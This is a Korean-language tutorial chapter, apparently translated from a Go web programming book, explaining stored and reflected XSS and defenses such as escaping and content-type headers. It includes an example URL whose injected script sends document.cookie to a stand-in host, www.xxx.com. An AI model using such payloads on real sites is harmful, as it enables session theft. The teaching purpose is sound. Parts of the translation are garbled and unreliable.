# XSS Attacks

인터넷 기술의 발전에 따라, 현재의 Web 어플리케이션은 모두 대량의 동적 콘텐츠를 포함시킴으로써 가용성을 높이고 있습니다. 이른바 동적 콘텐츠는 응용 프로그램이 사용자의 환경과 사용자의 요청에 따라 해당 내용을 출력하는 것을 말합니다. 동적 홈페이지는 "크로스 사이트 스크립팅 공격 (Cross Site Scripting 보안 전문가는 보통 이것을 생략하고 XSS라고합니다)"의 위협을받을 수 있습니다. 성적 홈페이지는 완전히이 영향을받지 않습니다.

## XSS 란 무엇인가
XSS 공격 : 크로스 사이트 스크립팅 (Cross-Site Scripting). 캐스 케이 딩 스타일 시트 (Cascading Style Sheets, CSS)의 생략과 혼동하지 않도록 크로스 사이트 스크립팅은 XSS와 생략됩니다. XSS는 흔히 볼 보안 취약점의 일종입니다. 이것은 공격자가 악성 코드를 다른 사용자가 사용하는 페이지에 삽입시키는 것을 허용 할 것이다. 많은 공격 (일반적으로 공격자와 피해자에만 영향을줍니다)과는 달리 XSS는 제삼자에 이릅니다. 즉 공격자 클라이언트와 Web 어플리케이션입니다. XSS 공격 목표는 클라이언트에 저장된 cookie 탈취 또는 클라이언트의 신분을 확인 신중하게 다루어야 정보를 사용하는 다른 페이지입니다. 일단 합법적 인 사용자의 정보가 취득되면 공격자는 합법적 인 사용자를 가장하여 페이지에 교환을 할 수 있습니다.

XSS는 일반적으로 두 가지로 나눌 수 있습니다 : 하나는 저장 형 XSS에서 주로 사용자 데이터를 입력하고 다른이 페이지를보고있는 사용자가 볼 수있는 장소에서 우연히합니다. 게시판, 덧글, 블로그 및 각종 양식 등입니다. 응용 프로그램은 데이터베이스에서 데이터를 검색하여 화면에 표시합니다. 공격자는 관련된 화면에서 악성 스크립트 데이터를 입력 한 다음 사용자가이 페이지를 볼 때 공격을받습니다. 이 과정을 간단히 설명하면 : 악의적 인 사용자의 Html가 Web 응용 프로그램에 입력 -> 데이터베이스에 입력 -> Web 응용 프로그램 -> 사용자의 브라우저. 다른 하나는 반사 형 XSS입니다. 주요 방법은 스크립트 코드를 URL 주소의 요청 매개 변수에 추가하는 것입니다. 요청 매개 변수가 프로그램에 들어가면 페이지에 직접 출력되어 사용자가 이러한 악의적 인 링크를 클릭하여 공격을받습니다.

현재 XSS의 주요 수단과 목적은 다음과 같습니다 :

- cookie를 훔치고 신중하게 다루어야 정보를 얻을 수 있습니다.
- Flash를 포함하여 crossdomain 권한 설정 더 높은 권한을 얻을 수 있습니다. 또는 Java 등을 이용하여 유사한 작업을 실시한다.
- iframe, frame, XMLHttpRequest 또는 위의 Flash 등 방법을 이용하여 (피해자) 사용자의 신분에있는 관리 작업을 수행한다. 또는 마이크로 블로그를 보내거나 친구를 추가하거나 개인 이메일을 보내거나 같은 일반적인 작업을 수행한다. 조금 전에 新浪 미 히로시는 XSS가 발생했습니다.
- 공격 가능한 영역을 이용하여 다른 영역의 신뢰의 기능을 받는다. 신뢰를받은 소스의 신분에서 일반적으로 허용되지 않는 작업을 요청한다. 예를 들어 부당한 투표 활동 등.
- PV가 매우 큰 페이지에서 XSS는 소형의 페이지를 공격하고 DDoS 공격의 효과를 얻을 수있다.

## XSS의 원리
Web 어플리케이션은 사용자가 보낸 요청 데이터에 대해 충분한 검사 및 필터링을 수행하지 않은 경우 사용자가 전송하는 데이터에 HTML 코드를 허용 할 것이다 (주로 ">", "<") 이스케이프되어 없는 악의적 인 코드를 제삼자 인 사용자의 브라우저에서 해석 / 실행시켜 버립니다. 이것이 XSS 보안 취약점을 낳는 원인이되고 있습니다.

이하에서는 반사 형 XSS를 예로 XSS 프로세스를 설명합니다 : 매개 변수에 의해 사용자의 이름을 출력하는 페이지가 있다고합니다. 예를 들어 url :`http : //127.0.0.1/? name = astaxie`에 액세스하면 브라우저에서 다음과 같은 정보를 출력합니다 :

hello astaxie

만약 우리가`http://127.0.0.1/?name=&#60;script&#62;alert (& # 39; astaxie, xss & # 39;) & # 60; / script & # 62;`같은 url 를 보내면 브라우저가 대화 상자를 표시하는 것을 알 것입니다. 즉, 페이지에 XSS 보안 취약점이 존재하는 것을 보여줍니다. 는 악의적 인 사용자는 어떻게하고 Cookie를 훔치는 것입니까? 위처럼`http : //127.0.0.1/? name = & # 60; script & # 62; ​​document.location.href = 'http : //www.xxx.com/cookie? + document.cookie & # 60; / script & # 62;`라는 url은 현재 cookie가 지정된 페이지 www.xxx.com로 전송됩니다. 이러한 URL은 한번보고 문제가 알 것이라고 생각 될지도 모릅니다. 도대체 누가 클릭 냐고. 그렇습니다. 이러한 URL은 남을 의심하기 쉽습니다. 그러나 URL 단축 서비스를 사용하여이를 단축하면 당신은주의 할 수 있을까요? 공격자는 단축 된 url을 어떤 경로로 전파 진상을 모르는 사용자가 일단 이런 url을 클릭하여 해당 cookie 데이터가 미리 설정된 페이지로 전송되어 버립니다. 이처럼 사용자의 cookie 정보를 훔친 후에는 Websleuth 같은 도구를 사용하여이 사용자 계정을 훔쳐 수 있는지 검사하게됩니다.

XSS에 대한 더 자세한 분석은 "[시나 웨이 보 XSS 사건 분석] (http://www.rising.com.cn/newsletter/news/2011-08-18/9621.html)"라는 기사를 참고로 해 바랍니다.

## 어떻게하고 XSS를 예방하거나
대답은 간단합니다. 사용자의 어떠한 입력도 결코 신용하지 않고 입력에 포함 된 모든 특수 문자를 필터링하는 것입니다. 이렇게하면 대부분의 XSS 공격을 근절 할 수 있습니다.

현재 XSS 방어는 주로 다음과 같은 몇 가지 방법이 있습니다 :

- 특수 문자 필터링

XSS를 방지하는 방법 중 하나는 주로 사용자가 제공하는 콘텐츠에 대해 필터링을 할 것입니다. Go 언어에서는 HTML 필터링 기능을 제공합니다 :

text / template 패키지 HTMLEscapeString, JSEscapeString 같은 함수입니다.

- HTTP 헤더에 지정된 형식을 사용하는

`w.Header () Set ( "Content-Type", "text / javascript")`

이렇게함으로써 브라우저에 html을 출력하지 않고 javascript 코드를 해석 할 수 있습니다.


## 정리
XSS 보안 취약점은 매우 위험한 것입니다. Web 응용 프로그램을 개발하고있을 때, 반드시 데이터를 필터링하도록 명심해야합니다. 특히 클라이언트에 출력하기 전에. 이것은 현재 XSS를 방지하는 수단으로 사용할 수 있습니다.

